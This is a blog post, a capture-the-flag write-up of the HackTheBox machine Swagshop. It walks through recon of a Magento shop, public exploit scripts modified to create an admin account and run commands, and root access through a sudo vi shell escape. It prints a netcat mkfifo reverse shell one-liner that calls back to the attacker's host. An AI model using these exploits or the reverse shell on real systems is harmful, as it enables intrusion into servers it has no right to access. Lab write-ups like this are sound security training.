
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="HandheldFriendly" content="True" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="robots" content="" />

  <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&display=swap" rel="stylesheet">

    <link rel="stylesheet" type="text/css" href="../../theme/stylesheet/style.min.css">

    <link id="dark-theme-style" rel="stylesheet" type="text/css"
          media="(prefers-color-scheme: dark)"
    href="../../theme/stylesheet/dark-theme.min.css">

    <link id="pygments-dark-theme" rel="stylesheet" type="text/css"
              media="(prefers-color-scheme: dark)"
          href="../../theme/pygments/monokai.min.css">
    <link id="pygments-light-theme" rel="stylesheet" type="text/css"
              media="(prefers-color-scheme: light), (prefers-color-scheme: no-preference)"
          href="../../theme/pygments/sas.min.css">


  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/fontawesome.css">
  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/brands.css">
  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/solid.css">


    <link href="https://maggick.fr/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="maggick's logs Atom">



  


 

<meta name="author" content="maggick" />
<meta name="description" content="This article is a writeup about a retired HacktheBox machine: Swagshop This box was suppose to be an easy one. Turns out it wasn&#39;t. I struggle a lot in wrong direction and finally found a path to root this magento box. This article presents the different methods which failed on the box as well as the solution to root it." />
<meta name="keywords" content="security, boot2root, HTB, linux, mangento">


  <meta property="og:site_name" content="maggick's logs"/>
  <meta property="og:title" content="HTB: Swagshop"/>
  <meta property="og:description" content="This article is a writeup about a retired HacktheBox machine: Swagshop This box was suppose to be an easy one. Turns out it wasn&#39;t. I struggle a lot in wrong direction and finally found a path to root this magento box. This article presents the different methods which failed on the box as well as the solution to root it."/>
  <meta property="og:locale" content="en_US"/>
  <meta property="og:url" content="../../2019/09/htb-swagshop.html"/>
  <meta property="og:type" content="article"/>
  <meta property="article:published_time" content="2019-09-29 09:00:00+02:00"/>
  <meta property="article:modified_time" content=""/>
  <meta property="article:author" content="../../author/maggick.html">
  <meta property="article:section" content="security"/>
  <meta property="article:tag" content="security"/>
  <meta property="article:tag" content="boot2root"/>
  <meta property="article:tag" content="HTB"/>
  <meta property="article:tag" content="linux"/>
  <meta property="article:tag" content="mangento"/>
  <meta property="og:image" content="https://maggick.fr/meida/image.png">

  <title>maggick's logs &ndash; HTB: Swagshop</title>

</head>
<body >
  <aside>
    <div>
      <a href="../../">
        <img src="https://maggick.fr/meida/image.png" alt="" title="">
      </a>

      <h1>
        <a href="../../"></a>
      </h1>



      <nav>
        <ul class="list">


              <li>
                <a target="_self"
                   href="../../pages/about.html">
                  About
                </a>
              </li>
              <li>
                <a target="_self"
                   href="../../pages/notes.html">
                  Notes
                </a>
              </li>
              <li>
                <a target="_self"
                   href="../../pages/tools.html">
                  Tools
                </a>
              </li>

        </ul>
      </nav>

      <ul class="social">
          <li>
            <a  class="sc-github" href="https://github.com/maggick" target="_blank">
              <i class="fab fa-github"></i>
            </a>
          </li>
          <li>
            <a  class="sc-twitter" href="https://twitter.com/maggick_fr" target="_blank">
              <i class="fab fa-twitter"></i>
            </a>
          </li>
          <li>
            <a  class="sc-stack-overflow" href="http://stackoverflow.com/users/1827067/maggick" target="_blank">
              <i class="fab fa-stack-overflow"></i>
            </a>
          </li>
          <li>
            <a  class="sc-rss" href="https://maggick.fr/feeds/all.atom.xml" target="_blank">
              <i class="fas fa-rss"></i>
            </a>
          </li>
      </ul>
    </div>

  </aside>
  <main>

    <nav>
      <a href="../../">Home</a>

      <a href="/archives.html">Archives</a>
      <a href="/categories.html">Categories</a>
      <a href="/tags.html">Tags</a>

      <a href="https://maggick.fr/feeds/all.atom.xml">Atom</a>

    </nav>

<article class="single">
  <header>
      
    <h1 id="htb-swagshop">HTB: Swagshop</h1>
    <p>
      Posted on 29 Sep 2019 in <a href="../../category/security.html">security</a>

        &#8226; 6 min read
    </p>
  </header>


  <div>
    <p><img class="align-left" src="/media/2019.09/swagshop_card.png" alt="Swagshop Card" width="262"></p>
<p>This article is a writeup about a retired HacktheBox machine:
<a href="https://www.hackthebox.com/home/machines/profile/188">Swagshop</a>
This box was suppose to be an easy one. Turns out it wasn't. I struggle a lot in
wrong direction and finally found a path to root this magento box.</p>
<p>This article presents the different methods which failed on the box as well as
the solution to root it.</p>


<p>[TOC]</p>
<h1>Recon</h1>
<h2>nmap</h2>
<div class="highlight"><pre><span></span><code># Nmap 7.80 scan initiated Tue Sep 17 14:15:38 2019 as: nmap -oA 10.10.10.140 -sS 10.10.10.140
Nmap scan report for 10.10.10.140
Host is up (0.019s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

# Nmap done at Tue Sep 17 14:15:43 2019 -- 1 IP address (1 host up) scanned in 4.94 seconds
</code></pre></div>

<h2>Web</h2>
<p>As there is only an SSH and a HTTP port, we continue our recon on the web part.</p>
<p>When accessing the website we can observe a Magento website.</p>
<p><img alt="Swag shop homepage" src="/media/2019.09/swagshop_3.png"></p>
<p>Let us try a dirb:</p>
<div class="highlight"><pre><span></span><code>root@kalili:~# dirb http://10.10.10.140/

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Tue Sep 17 14:27:20 2019
URL_BASE: http://10.10.10.140/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://10.10.10.140/ ----
==&gt; DIRECTORY: http://10.10.10.140/app/
==&gt; DIRECTORY: http://10.10.10.140/errors/
+ http://10.10.10.140/favicon.ico (CODE:200|SIZE:1150)
==&gt; DIRECTORY: http://10.10.10.140/includes/
+ http://10.10.10.140/index.php (CODE:200|SIZE:16097)
==&gt; DIRECTORY: http://10.10.10.140/js/
==&gt; DIRECTORY: http://10.10.10.140/lib/
==&gt; DIRECTORY: http://10.10.10.140/media/
==&gt; DIRECTORY: http://10.10.10.140/pkginfo/
+ http://10.10.10.140/server-status (CODE:403|SIZE:300)
==&gt; DIRECTORY: http://10.10.10.140/shell/
==&gt; DIRECTORY: http://10.10.10.140/skin/
==&gt; DIRECTORY: http://10.10.10.140/var/
&lt;SNIP&gt;
</code></pre></div>

<p>We see that there is a lot of directories accessible directly.
We can gather a lot of information from them, for instance the release notes
gives us some information by the version of the application:</p>
<p><img alt="Swag shop release note" src="/media/2019.09/swagshop_2.png"></p>
<p>An admin panel is also accessible on the application:</p>
<p><img alt="Swag shop admin panel" src="/media/2019.09/swagshop_4.png"></p>
<p>Let us see what CVE are available for magento. Our version is 1.7.0.2.</p>
<div class="highlight"><pre><span></span><code># searchsploit magento
-------------------------------------------------------------------------------------------------------------- ----------------------------------
 Exploit Title                                                                                                |  Path
                                                                                                              | (/usr/share/exploitdb/)
-------------------------------------------------------------------------------------------------------------- ----------------------------------
Magento 1.2 - &#39;/app/code/core/Mage/Admin/Model/Session.php?login[&#39;Username&#39;]&#39; Cross-Site Scripting            | exploits/php/webapps/32808.txt
Magento 1.2 - &#39;/app/code/core/Mage/Adminhtml/controllers/IndexController.php?email&#39; Cross-Site Scripting      | exploits/php/webapps/32809.txt
Magento 1.2 - &#39;downloader/index.php&#39; Cross-Site Scripting                                                     | exploits/php/webapps/32810.txt
Magento &lt; 2.0.6 - Arbitrary Unserialize / Arbitrary Write File                                                | exploits/php/webapps/39838.php
Magento CE &lt; 1.9.0.1 - (Authenticated) Remote Code Execution                                                  | exploits/php/webapps/37811.py
Magento Server MAGMI Plugin - Multiple Vulnerabilities                                                        | exploits/php/webapps/35996.txt
Magento Server MAGMI Plugin 0.7.17a - Remote File Inclusion                                                   | exploits/php/webapps/35052.txt
Magento eCommerce - Local File Disclosure                                                                     | exploits/php/webapps/19793.txt
Magento eCommerce - Remote Code Execution                                                                     | exploits/xml/webapps/37977.py
eBay Magento 1.9.2.1 - PHP FPM XML eXternal Entity Injection                                                  | exploits/php/webapps/38573.txt
eBay Magento CE 1.9.2.1 - Unrestricted Cron Script (Code Execution / Denial of Service)                       | exploits/php/webapps/38651.txt
-------------------------------------------------------------------------------------------------------------- ----------------------------------
Shellcodes: No Result
</code></pre></div>

<p>Our application is vulnerable to two interesting exploit:</p>
<ul>
<li>Magento eCommerce - Remote Code Execution (exploits/xml/webapps/37977.py)</li>
<li>Magento CE &lt; 1.9.0.1 - (Authenticated) Remote Code Execution (exploits/php/webapps/37811.py)</li>
</ul>
<h2>Getting Admin</h2>
<p>The second exploit allow to create an admin account on the application.</p>
<p>But the exploit's script use a wrong URL. We add "/index.php/admin/" to the
target URL:</p>
<div class="highlight"><pre><span></span><code><span class="n">target_url</span> <span class="o">=</span> <span class="n">target</span> <span class="o">+</span> <span class="s2">&quot;/index.php/admin/Cms_Wysiwyg/directive/index/&quot;</span>
</code></pre></div>

<p>This will create an administrator account named "forme" with the same password.
We can then login to the admin panel and access the full magento framework.</p>
<p><img alt="magenta admin panel" src="/media/2019.09/swagshop_1.png"></p>
<h2>The RCE way</h2>
<h3>To the user flag</h3>
<p>From there a few possibility will allow us to execute code on the application:</p>
<p>The first one is to upload a magento extension using the download. A blog
post from jvoisin explain how to write this "simple" backdoor:
<a href="https://dustri.org/b/writing-a-simple-extensionbackdoor-for-magento.html">Writing a simple extension/backdoor for Magento</a>.
Nevertheless, the downloader is disabled a return a 404 error.</p>
<p>The second one implies to create a new product and exploit a phtml page to
execute code on the server. An article blog describe the process
<a href="https://blog.scrt.ch/2019/01/24/magento-rce-local-file-read-with-low-privilege-admin-rights/">Sec Team Blog</a>.
Once more this method does not seems to work. Maybe our Magenton version is too
old an the vulnerability is not introduce on the application yet.</p>
<p>An other on is to exploit the "froghopper" attack described in a
<a href="https://www.foregenix.com/blog/anatomy-of-a-magento-attack-froghopper">forgenix blog post</a>.
Again, the uploaded code was not executed on the server</p>
<p>The last option is to use the other exploit that was listed with searchsploit:
Magento CE &lt; 1.9.0.1 - (Authenticated) Remote Code Execution (exploits/php/webapps/37811.py)</p>
<p>We change the install_date parameter and we add our credentials to the script.</p>
<div class="highlight"><pre><span></span><code><span class="n">install_date</span> <span class="o">=</span> <span class="s1">&#39;Wed, 08 May 2019 07:23:09 +0000&#39;</span>  <span class="c1"># This needs to be the exact date from /app/etc/local.xml</span>
</code></pre></div>

<p>Then we launch the script:</p>
<div class="highlight"><pre><span></span><code>python sploi.py http://10.10.10.140/index.php/admin <span class="s2">&quot;uname -a&quot;</span>
Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
  File <span class="s2">&quot;37811.py&quot;</span>, line <span class="m">69</span>, <span class="k">in</span> &lt;module&gt;
    <span class="nv">tunnel</span> <span class="o">=</span> tunnel.group<span class="o">(</span><span class="m">1</span><span class="o">)</span>
    AttributeError: <span class="s1">&#39;NoneType&#39;</span> object has no attribute <span class="s1">&#39;group&#39;</span>
</code></pre></div>

<p>The error is because in the last 7 days there were no sales. We can change
this parameter in the exploit code (we put 2 years to be safe):</p>
<div class="highlight"><pre><span></span><code><span class="c1">#request = br.open(url + &#39;block/tab_orders/period/7d/?isAjax=true&#39;, data=&#39;isAjax=false&amp;form_key=&#39; + key)</span>
<span class="n">request</span> <span class="o">=</span> <span class="n">br</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="s1">&#39;block/tab_orders/period/2y/?isAjax=true&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="s1">&#39;isAjax=false&amp;form_key=&#39;</span> <span class="o">+</span> <span class="n">key</span><span class="p">)</span>
<span class="n">tunnel</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s2">&quot;src=</span><span class="se">\&quot;</span><span class="s2">(.*)\?ga=&quot;</span><span class="p">,</span> <span class="n">request</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
<span class="n">tunnel</span> <span class="o">=</span> <span class="n">tunnel</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</code></pre></div>

<p>We relaunch the script:</p>
<div class="highlight"><pre><span></span><code>python sploi.py http://10.10.10.140/index.php/admin <span class="s2">&quot;uname -a&quot;</span>
Linux swagshop <span class="m">4</span>.4.0-146-generic <span class="c1">#172-Ubuntu SMP Wed Apr 3 09:00:08 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span>
python sploi.py http://10.10.10.140/index.php/admin <span class="s2">&quot;whoami&quot;</span>
www-data
</code></pre></div>

<p>We get a remote code execution. From there we can get a reverse shell or do
everything only with the RCE. I struggle a bit with the reverse shell before
finding the right one. Therefore I will start with the RCE only exploitation.</p>
<p>As the box is often reset by other players we chain the two exploit in a bash
script.</p>
<div class="highlight"><pre><span></span><code>python <span class="m">37977</span>.py
python sploi.py http://10.10.10.140/index.php/admin <span class="s2">&quot;whoami&quot;</span>
</code></pre></div>

<p><em>Fron now on I will only write the command of the second script ("whoami" in the
exemple above) and make more than one command by duplicating the line.</em></p>
<p>We want to get the user flag. In HTB's VM there is always a user flag in
/home/<some user>/user.txt and a root flag in /root/root.txt (at least on the
Linux One). So we look at the user directory:</p>
<div class="highlight"><pre><span></span><code>ls /home/
haris
</code></pre></div>

<p>We list the user folder:</p>
<div class="highlight"><pre><span></span><code>ls /home/haris/
user.txt
</code></pre></div>

<p>And we get the user flag:</p>
<div class="highlight"><pre><span></span><code>cat /home/haris/user.txt
a4488&lt;redacted&gt;
</code></pre></div>

<h3>let's get root</h3>
<p>We start by enumerating our permissions on the box:</p>
<div class="highlight"><pre><span></span><code>sudo -l
Matching Defaults entries for www-data on swagshop:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on swagshop:
    (root) NOPASSWD: /usr/bin/vi /var/www/html/*
</code></pre></div>

<p>It is well known that Vi let you run system command. Nevertheless we must execute
this command without a shell. For that we can use the vi "-c" option:</p>
<div class="highlight"><pre><span></span><code>python sploi.py http://10.10.10.140/index.php/admin &quot;sudo /usr/bin/vi /var/www/html/1 -c &#39;:! cat /root/root.txt &gt; /tmp/mak/6&#39;&quot;
python sploi.py http://10.10.10.140/index.php/admin &quot;cat /tmp/mak/6&quot;
c2b087&lt;redacted&gt;
      ___ ___
    /| |/|\| |\
  /_| Â´ |.` |_\           We are open! (Almost)
    |   |.  |
    |   |.  |         Join the beta HTB Swag Store!
    |___|.__|       https://hackthebox.store/password

                              PS: Use root flag as password!
</code></pre></div>

<h2>Reverse shell way</h2>
<p>There is another way to resolve this part of the box: using a reverse shell!</p>
<p>My classic python reverse shell was not working as there was no python on the box and
the bash reverse was also not working. Nevertheless, the netcat one was working:</p>
<div class="highlight"><pre><span></span><code>python sploi.py http://10.10.10.140/index.php/admin <span class="s2">&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.148 1234 &gt;/tmp/f&quot;</span>
</code></pre></div>

<p>On the client side we need to open a listener with netcat:</p>
<div class="highlight"><pre><span></span><code>netcat -lvp <span class="m">1234</span>
</code></pre></div>

<p>Then we got a reverse shell!</p>
<p>With this reverse shell the commands are the same but faster ;).
We can easily find the user flag:</p>
<div class="highlight"><pre><span></span><code>ls /home/
haris
ls /home/haris/
user.txt
cat /home/haris/user.txt
a44887&lt;redacted&gt;
</code></pre></div>

<p>For the privilege escalation we can just spwan a vi:</p>
<div class="highlight"><pre><span></span><code>$ sudo -l
Matching Defaults entries for www-data on swagshop:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on swagshop:
    (root) NOPASSWD: /usr/bin/vi /var/www/html/*
$ sudo /usr/bin/vi /var/www/html/1
</code></pre></div>

<p>We get an error about the terminal not being interactive:</p>
<div class="highlight"><pre><span></span><code>Vim: Warning: Output is not to a terminal
Vim: Warning: Input is not from a terminal
</code></pre></div>

<p>Then we just enter the command to get a shell from vi:</p>
<div class="highlight"><pre><span></span><code>:! /bin/bash
id
uid=0(root) gid=0(root) groups=0(root)
ls /root/
root.txt
cat /root/root.txt
c2b087&lt;redacted&gt;
</code></pre></div>

<h1>Wrapping up</h1>
<p>This box was really interesting. I learned a lot about magento admin panel. As
the downloader was disabled, the easiest way to execute code on the box was not
available and I had to find other ways to execute code on a magento website from
the admin panel. This might became handy someday.
The privilege escalation was quit easy as I know a lot about vi.</p>
  </div>
  <div class="tag-cloud">
    <p>
      <a href="../../tag/security.html">security</a>
      <a href="../../tag/boot2root.html">boot2root</a>
      <a href="../../tag/htb.html">HTB</a>
      <a href="../../tag/linux.html">linux</a>
      <a href="../../tag/mangento.html">mangento</a>
    </p>
  </div>


  <div class="neighbors">
    <a class="btn float-left" href="../../2019/09/htb-jerry.html" title="HTB: Jerry">
      <i class="fa fa-angle-left"></i> Previous Post
    </a>
    <a class="btn float-right" href="../../2019/10/htb-writeup.html" title="HTB: Writeup">
      Next Post <i class="fa fa-angle-right"></i>
    </a>
  </div>



</article>

    <footer>
<p>
  &copy; 2022  - This work is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by/4.0/deed.en_US" target="_blank">Creative Commons Attribution</a>
</p>
<p>
Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
  <span class="footer-separator">|</span>
  Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
  <script id="dark-theme-script"
          src="../../theme/dark-theme/dark-theme.min.js"
          data-enable-auto-detect-theme="True"
          data-default-theme="light"
          type="text/javascript">
  </script>
</p><p>
  <a rel="license"
     href="http://creativecommons.org/licenses/by/4.0/"
     target="_blank">
    <img alt="Creative Commons License"
         title="Creative Commons License"
         style="border-width:0"
           src="https://i.creativecommons.org/l/by/4.0/80x15.png"
         width="80"
         height="15"/>
  </a>
</p>    </footer>
  </main>




<script type="application/ld+json">
{
  "@context" : "http://schema.org",
  "@type" : "Blog",
  "name": " maggick's logs ",
  "url" : "../..",
  "image": "https://maggick.fr/meida/image.png",
  "description": ""
}
</script>

</body>
</html>